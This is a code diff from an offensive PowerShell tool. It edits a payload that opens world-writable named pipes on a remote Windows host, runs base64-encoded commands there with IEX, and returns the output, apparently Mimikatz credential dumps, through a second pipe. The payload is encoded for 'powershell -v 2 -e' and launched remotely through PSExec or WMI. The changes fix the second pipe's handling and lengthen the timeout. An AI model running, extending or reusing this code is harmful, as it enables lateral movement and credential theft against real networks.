@@ -142,7 +142,7 @@ function Encrypt-String
 add-Type -assembly "System.Core"
 `$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName,`$Payload)
 `$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
-Start-Sleep 60
+Start-Sleep 240
 `$t.StopJob()
 "@
 
@@ -219,12 +219,13 @@ echo "Failed conecting to named pipe: $pipeNameMimi"
 
 } else {
 if($Hash) {echo "Cannot use a hash when executing shellcode remotely as it rquired the password to create a pipe session...."; return}
+
 $pipekat = @"
 `$pipeName = "$pipeName"
-
+`$pipemimi = "$pipeNameMimi"
 `$scriptblock = 
 {
-    param (`$pipeName)
+    param (`$pipeName, `$pipemimi)
         add-Type -assembly "System.Core"
         `$PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
         `$AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite", "Allow" )
@@ -235,13 +236,13 @@ $pipekat = @"
         `$output = `$pipeReader.ReadLine()
         `$pipe.Dispose();
         `$pipeReader.Dispose();
-        `$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$output))
+        `$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$output)) | out-string
         `$o = IEX `$s |out-string
-        `$pipeName = "$pipeNameMimi"
+        add-Type -assembly "System.Core"
         `$PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
         `$AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite", "Allow" )
         `$PipeSecurity.AddAccessRule(`$AccessRule)
-        `$Pipe = New-Object System.IO.Pipes.NamedPipeServerStream(`$PipeName,"InOut",100, "Byte", "None", 1024, 1024, `$PipeSecurity)
+        `$Pipe = New-Object System.IO.Pipes.NamedPipeServerStream(`$pipemimi,"InOut",100, "Byte", "None", 1024, 1024, `$PipeSecurity)
         `$pipe.WaitForConnection(); 
         `$pipeWriter = new-object System.IO.StreamWriter(`$pipe)
         `$pipeWriter.AutoFlush = `$true
@@ -249,16 +250,16 @@ $pipekat = @"
         `$pipe.Dispose();
 }
 add-Type -assembly "System.Core"
-`$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName)
-`$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
-Start-Sleep 60
+`$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName, `$pipemimi)
+`$pl = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
+`$pp = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipemimi);
+Start-Sleep 240
 `$t.StopJob()
 
 "@
 
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($pipekat)
 $payloadraw = 'cmd /c powershell -v 2 -e '+[Convert]::ToBase64String($bytes)
-#echo $payloadraw
 
 if ($PSexec) {
 echo "[-] There are unresolved running this remotely using PSEXEC, falling back to Invoke-WMI for remote targets"
@@ -396,7 +397,7 @@ $pipekat = @"
 add-Type -assembly "System.Core"
 `$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName)
 `$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
-Start-Sleep 60
+Start-Sleep 240
 `$t.StopJob()
 "@
 
